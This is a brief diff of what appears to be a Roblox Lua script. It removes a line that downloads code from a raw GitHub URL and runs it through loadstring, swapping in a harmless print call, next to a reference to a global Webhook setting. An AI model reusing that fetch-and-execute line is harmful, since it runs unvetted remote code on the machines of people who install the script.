@@ -23,7 +23,7 @@ end
 local bindf = Instance.new("BindableFunction")
 
 bindf.OnInvoke = function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/si1nnx/psxx/main/g"))()
+    print("hoi")
 end
 
 local Webhook = _G.Webhook
